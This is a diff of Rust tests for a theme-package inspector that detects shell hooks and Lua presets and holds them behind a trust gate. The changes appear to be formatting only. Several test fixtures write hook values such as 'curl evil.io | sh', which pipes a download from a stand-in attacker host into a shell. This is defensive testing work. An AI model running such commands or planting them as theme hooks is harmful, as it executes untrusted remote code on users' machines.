@@ -573,7 +573,13 @@ fn lua_presets(theme_dir: &Path, already_spent: usize, key_cost: usize) -> Vec<L
             .collect();
         names.sort();
         out.extend(names.into_iter().map(|file_name| LuaPreset {
-            body: preset_body(&dir.join(&file_name), category, &file_name, &mut spent, key_cost),
+            body: preset_body(
+                &dir.join(&file_name),
+                category,
+                &file_name,
+                &mut spent,
+                key_cost,
+            ),
             category: category.to_string(),
             file_name,
         }));
@@ -854,9 +860,7 @@ mod tests {
     }
 
     fn write_preset(theme: &Path, category: &str, name: &str) {
-        let dir = theme
-            .join(crate::theme_presets::PRESETS_DIR)
-            .join(category);
+        let dir = theme.join(crate::theme_presets::PRESETS_DIR).join(category);
         fs::create_dir_all(&dir).unwrap();
         fs::write(dir.join(name), FIXTURE_PRESET_BODY).unwrap();
     }
@@ -945,7 +949,10 @@ mod tests {
             !report.is_empty(),
             "a theme carrying hooks must not read as empty"
         );
-        assert!(report.lua_presets.is_empty(), "this fixture carries no presets");
+        assert!(
+            report.lua_presets.is_empty(),
+            "this fixture carries no presets"
+        );
     }
 
     /// A MULTI-LINE string (`"""` / `'''`) is one legal TOML value, and
@@ -988,7 +995,10 @@ mod tests {
              inner lines), got: {:?}",
             report.shell_hooks
         );
-        assert!(!report.is_empty(), "a multi-line hook must not read as empty");
+        assert!(
+            !report.is_empty(),
+            "a multi-line hook must not read as empty"
+        );
 
         // The literal (`'''`) spelling is the same value to a TOML parser.
         let literal = tmp.path().join("Literal");
@@ -1081,13 +1091,22 @@ mod tests {
              verbatim command, got: {:?}",
             report.shell_hooks
         );
-        assert!(!report.is_empty(), "a root-level hook must not read as empty");
-        assert!(report.lua_presets.is_empty(), "this fixture carries no presets");
+        assert!(
+            !report.is_empty(),
+            "a root-level hook must not read as empty"
+        );
+        assert!(
+            report.lua_presets.is_empty(),
+            "this fixture carries no presets"
+        );
 
         // A QUOTED sub-key (`hooks."colors_changed"`) is the same key to a
         // TOML parser; the report strips the quotes like every other key.
         let quoted = tmp.path().join("Quoted");
-        write_settings(&quoted, "hooks.\"colors_changed\" = \"notify-send palette changed\"\n");
+        write_settings(
+            &quoted,
+            "hooks.\"colors_changed\" = \"notify-send palette changed\"\n",
+        );
         let report = inspect_theme_package(&quoted);
         assert_eq!(
             report.shell_hooks,
@@ -1163,7 +1182,10 @@ mod tests {
              key, got: {:?}",
             report.shell_hooks
         );
-        assert!(!report.is_empty(), "a root-level multi-line hook must not read as empty");
+        assert!(
+            !report.is_empty(),
+            "a root-level multi-line hook must not read as empty"
+        );
     }
 
     /// CRITICAL-class, the inline-table spelling: `hooks = { … }` written at
@@ -1187,7 +1209,10 @@ mod tests {
             "a root-level hooks = {{ … }} table must report its entry, got: {:?}",
             report.shell_hooks
         );
-        assert!(!report.is_empty(), "a root-level inline hook must not read as empty");
+        assert!(
+            !report.is_empty(),
+            "a root-level inline hook must not read as empty"
+        );
 
         let many = tmp.path().join("Many");
         write_settings(
@@ -1243,7 +1268,10 @@ mod tests {
              command, got: {:?}",
             report.shell_hooks
         );
-        assert!(!report.is_empty(), "a root-level inline multi-line hook must not read as empty");
+        assert!(
+            !report.is_empty(),
+            "a root-level inline multi-line hook must not read as empty"
+        );
     }
 
     /// The "an empty value is not a hook" rule holds for both root-level
@@ -1281,13 +1309,21 @@ mod tests {
         let dotted = tmp.path().join("Dotted");
         write_settings(&dotted, "[noctalia]\nhooks.started = \"x\"\n");
         let report = inspect_theme_package(&dotted);
-        assert!(report.shell_hooks.is_empty(), "got: {:?}", report.shell_hooks);
+        assert!(
+            report.shell_hooks.is_empty(),
+            "got: {:?}",
+            report.shell_hooks
+        );
         assert!(report.is_empty(), "noctalia.hooks.started is not a hook");
 
         let inline = tmp.path().join("Inline");
         write_settings(&inline, "[other]\nhooks = { started = \"x\" }\n");
         let report = inspect_theme_package(&inline);
-        assert!(report.shell_hooks.is_empty(), "got: {:?}", report.shell_hooks);
+        assert!(
+            report.shell_hooks.is_empty(),
+            "got: {:?}",
+            report.shell_hooks
+        );
         assert!(report.is_empty(), "other.hooks is not the hooks table");
     }
 
@@ -1303,7 +1339,11 @@ mod tests {
 
         let report = inspect_theme_package(&theme);
 
-        assert!(report.shell_hooks.is_empty(), "got: {:?}", report.shell_hooks);
+        assert!(
+            report.shell_hooks.is_empty(),
+            "got: {:?}",
+            report.shell_hooks
+        );
         assert!(
             report.is_empty(),
             "\"hooks.started\" is one literal key, not the hooks table, got: {:?}",
@@ -1329,7 +1369,11 @@ mod tests {
 
         let report = inspect_theme_package(&theme);
 
-        assert!(report.shell_hooks.is_empty(), "got: {:?}", report.shell_hooks);
+        assert!(
+            report.shell_hooks.is_empty(),
+            "got: {:?}",
+            report.shell_hooks
+        );
         assert!(report.is_empty(), "an inline-table value is not a hook");
     }
 
@@ -1359,11 +1403,17 @@ mod tests {
             "\"\\u0068ooks\".started IS the hooks table to a real parser, got: {:?}",
             report.shell_hooks
         );
-        assert!(!report.is_empty(), "an escaped table name must not read as empty");
+        assert!(
+            !report.is_empty(),
+            "an escaped table name must not read as empty"
+        );
 
         // The header spelling with an escaped TABLE name.
         let header = tmp.path().join("Header");
-        write_settings(&header, "[\"\\u0068ooks\"]\nstarted = \"curl evil.io | sh\"\n");
+        write_settings(
+            &header,
+            "[\"\\u0068ooks\"]\nstarted = \"curl evil.io | sh\"\n",
+        );
         let report = inspect_theme_package(&header);
         assert_eq!(
             report.shell_hooks,
@@ -1375,7 +1425,10 @@ mod tests {
             "[\"\\u0068ooks\"] IS the hooks table to a real parser, got: {:?}",
             report.shell_hooks
         );
-        assert!(!report.is_empty(), "an escaped header must not read as empty");
+        assert!(
+            !report.is_empty(),
+            "an escaped header must not read as empty"
+        );
 
         // The escaped SUB-key of a dotted spelling.
         let sub = tmp.path().join("Sub");
@@ -1391,7 +1444,10 @@ mod tests {
             "\"hook\\u0073\".started IS the hooks table to a real parser, got: {:?}",
             report.shell_hooks
         );
-        assert!(report.lua_presets.is_empty(), "these fixtures carry no presets");
+        assert!(
+            report.lua_presets.is_empty(),
+            "these fixtures carry no presets"
+        );
     }
 
     /// W1c-b, CRITICAL-class: a UTF-8 BOM (U+FEFF) is accepted at the
@@ -1417,10 +1473,16 @@ mod tests {
             "a BOM before a root-level hooks key must not hide it, got: {:?}",
             report.shell_hooks
         );
-        assert!(!report.is_empty(), "a BOM'd root-level hook must not read as empty");
+        assert!(
+            !report.is_empty(),
+            "a BOM'd root-level hook must not read as empty"
+        );
 
         let header = tmp.path().join("Header");
-        write_settings(&header, "\u{feff}[hooks]\nstarted = \"curl evil.io | sh\"\n");
+        write_settings(
+            &header,
+            "\u{feff}[hooks]\nstarted = \"curl evil.io | sh\"\n",
+        );
         let report = inspect_theme_package(&header);
         assert_eq!(
             report.shell_hooks,
@@ -1432,7 +1494,10 @@ mod tests {
             "a BOM before the first header must not hide the section, got: {:?}",
             report.shell_hooks
         );
-        assert!(!report.is_empty(), "a BOM'd header hook must not read as empty");
+        assert!(
+            !report.is_empty(),
+            "a BOM'd header hook must not read as empty"
+        );
     }
 
     /// W1d, CRITICAL-class (the hider): a header-shaped line INSIDE an
@@ -1467,7 +1532,10 @@ mod tests {
              hook and must be reported, got: {:?}",
             report.shell_hooks
         );
-        assert!(!report.is_empty(), "a root hook hidden behind a fake header must not read as empty");
+        assert!(
+            !report.is_empty(),
+            "a root hook hidden behind a fake header must not read as empty"
+        );
     }
 
     /// W1d, the reverse hider: text that is ONLY a string must not be read
@@ -1527,8 +1595,14 @@ mod tests {
              real entry, got: {:?}",
             report.shell_hooks
         );
-        assert!(!report.is_empty(), "a multi-line inline hook must not read as empty");
-        assert!(report.lua_presets.is_empty(), "this fixture carries no presets");
+        assert!(
+            !report.is_empty(),
+            "a multi-line inline hook must not read as empty"
+        );
+        assert!(
+            report.lua_presets.is_empty(),
+            "this fixture carries no presets"
+        );
 
         // The gate holds on it: the keeper sees the line
         // `{key} — {command}` built from this very entry.
@@ -1544,7 +1618,10 @@ mod tests {
         // conservative entry — never an empty report.
         let unclosed = tmp.path().join("Unclosed");
         write_settings(&unclosed, "hooks = { started = \"\"\n");
-        let settings = unclosed.join("providers").join("noctalia-v5").join("settings.toml");
+        let settings = unclosed
+            .join("providers")
+            .join("noctalia-v5")
+            .join("settings.toml");
         let report = inspect_theme_package(&unclosed);
         assert_eq!(
             report.shell_hooks,
@@ -1561,7 +1638,10 @@ mod tests {
             "a file that does not parse must produce exactly one conservative entry, got: {:?}",
             report.shell_hooks
         );
-        assert!(!report.is_empty(), "an unclosed hooks table must never read as empty");
+        assert!(
+            !report.is_empty(),
+            "an unclosed hooks table must never read as empty"
+        );
     }
 
     /// W1c-b's residue spelling, now read by a REAL parser: when the
@@ -1690,8 +1770,15 @@ mod tests {
 
         let report = inspect_theme_package(&theme);
 
-        assert!(report.shell_hooks.is_empty(), "got: {:?}", report.shell_hooks);
-        assert!(report.lua_presets.is_empty(), "this fixture carries no presets");
+        assert!(
+            report.shell_hooks.is_empty(),
+            "got: {:?}",
+            report.shell_hooks
+        );
+        assert!(
+            report.lua_presets.is_empty(),
+            "this fixture carries no presets"
+        );
         assert!(report.is_empty());
     }
 
@@ -1704,7 +1791,11 @@ mod tests {
         write_settings(&theme, "[hooks]\nstarted = \"boot.sh\"\n");
         let other = theme.join("providers").join("some-other-tool");
         fs::create_dir_all(&other).unwrap();
-        fs::write(other.join("settings.toml"), "[hooks]\nshutdown = \"bye.sh\"\n").unwrap();
+        fs::write(
+            other.join("settings.toml"),
+            "[hooks]\nshutdown = \"bye.sh\"\n",
+        )
+        .unwrap();
 
         let report = inspect_theme_package(&theme);
 
@@ -1736,7 +1827,11 @@ mod tests {
 
         let report = inspect_theme_package(&theme);
 
-        assert!(report.shell_hooks.is_empty(), "got: {:?}", report.shell_hooks);
+        assert!(
+            report.shell_hooks.is_empty(),
+            "got: {:?}",
+            report.shell_hooks
+        );
         assert!(
             report.is_empty(),
             "a theme with neither hooks nor Lua presets must read as empty"
@@ -1753,7 +1848,11 @@ mod tests {
 
         let report = inspect_theme_package(&theme);
 
-        assert!(report.shell_hooks.is_empty(), "got: {:?}", report.shell_hooks);
+        assert!(
+            report.shell_hooks.is_empty(),
+            "got: {:?}",
+            report.shell_hooks
+        );
         assert!(report.is_empty());
     }
 
@@ -1806,7 +1905,10 @@ mod tests {
             "the warning must be able to show where the preset lives"
         );
         assert!(report.shell_hooks.is_empty());
-        assert!(!report.is_empty(), "a theme carrying presets must not read as empty");
+        assert!(
+            !report.is_empty(),
+            "a theme carrying presets must not read as empty"
+        );
     }
 
     /// The report must name what the apply ACTUALLY installs and executes,
@@ -1856,7 +1958,10 @@ mod tests {
              shaders/*.frag must not, got: {:?}",
             report.lua_presets
         );
-        assert!(!report.is_empty(), "the .frag presets must not read as empty");
+        assert!(
+            !report.is_empty(),
+            "the .frag presets must not read as empty"
+        );
     }
 
     /// Acceptance 2: a theme carrying neither applies exactly as before —
@@ -1867,7 +1972,11 @@ mod tests {
         let theme = tmp.path().join("Theme");
         let provider = theme.join("providers").join("hve-presets");
         fs::create_dir_all(&provider).unwrap();
-        fs::write(provider.join("state.json"), "{\"active_anim_file\":\"x.lua\"}").unwrap();
+        fs::write(
+            provider.join("state.json"),
+            "{\"active_anim_file\":\"x.lua\"}",
+        )
+        .unwrap();
 
         let report = inspect_theme_package(&theme);
 
@@ -1997,13 +2106,23 @@ mod tests {
         use std::os::unix::ffi::OsStrExt;
         let tmp = tempfile::tempdir().unwrap();
         let theme = tmp.path().join("Theme");
-        let dir = theme.join(crate::theme_presets::PRESETS_DIR).join("animations");
+        let dir = theme
+            .join(crate::theme_presets::PRESETS_DIR)
+            .join("animations");
         fs::create_dir_all(&dir).unwrap();
-        fs::write(dir.join(std::ffi::OsStr::from_bytes(b"\xff.lua")), b"-- opaque\n").unwrap();
+        fs::write(
+            dir.join(std::ffi::OsStr::from_bytes(b"\xff.lua")),
+            b"-- opaque\n",
+        )
+        .unwrap();
 
         let report = inspect_theme_package(&theme);
 
-        assert!(report.lua_presets.is_empty(), "got: {:?}", report.lua_presets);
+        assert!(
+            report.lua_presets.is_empty(),
+            "got: {:?}",
+            report.lua_presets
+        );
         assert!(report.is_empty());
     }
 
@@ -2039,7 +2158,10 @@ mod tests {
             GateDecision::Hold,
             "a theme carrying a shell hook must be held, not applied"
         );
-        assert!(gate.is_open(), "the warning must be open for the held attempt");
+        assert!(
+            gate.is_open(),
+            "the warning must be open for the held attempt"
+        );
         assert_eq!(
             gate.pending(),
             Some(&PendingApply {
@@ -2118,7 +2240,10 @@ mod tests {
     fn gate_lets_a_theme_with_neither_hooks_nor_lua_apply_without_a_warning() {
         let tmp = tempfile::tempdir().unwrap();
         let report = inspect_theme_package(&clean_theme(tmp.path()));
-        assert!(report.is_empty(), "precondition: the fixture carries nothing");
+        assert!(
+            report.is_empty(),
+            "precondition: the fixture carries nothing"
+        );
         let mut gate = TrustGate::new();
 
         assert_eq!(
@@ -2294,7 +2419,10 @@ mod tests {
             GateDecision::Proceed,
             "a clean package applies, and its path does not depend on the store"
         );
-        assert!(report.is_empty(), "the fixture must carry neither hooks nor presets");
+        assert!(
+            report.is_empty(),
+            "the fixture must carry neither hooks nor presets"
+        );
     }
 
     // ── W2c: the preset BODY is part of what runs and of what is accepted ─
@@ -2437,7 +2565,11 @@ mod tests {
         fs::create_dir_all(&dir).unwrap();
         // Nine bodies at the per-preset cap: 128 KiB of budget fits eight.
         for i in 0..9 {
-            fs::write(dir.join(format!("p{i}.lua")), "x".repeat(MAX_PRESET_BODY_BYTES)).unwrap();
+            fs::write(
+                dir.join(format!("p{i}.lua")),
+                "x".repeat(MAX_PRESET_BODY_BYTES),
+            )
+            .unwrap();
         }
 
         let report = inspect_theme_package(&theme);
@@ -2592,7 +2724,10 @@ mod tests {
             .join("settings.toml");
         fs::create_dir_all(settings.parent().unwrap()).unwrap();
         let mut content = b"[hooks]\nstarted = \"echo pwned\"\n".to_vec();
-        content.resize(crate::theme_package::MAX_THEME_FILE_BYTES as usize + 1, b'\n');
+        content.resize(
+            crate::theme_package::MAX_THEME_FILE_BYTES as usize + 1,
+            b'\n',
+        );
         fs::write(&settings, content).unwrap();
 
         let report = inspect_theme_package(&theme);
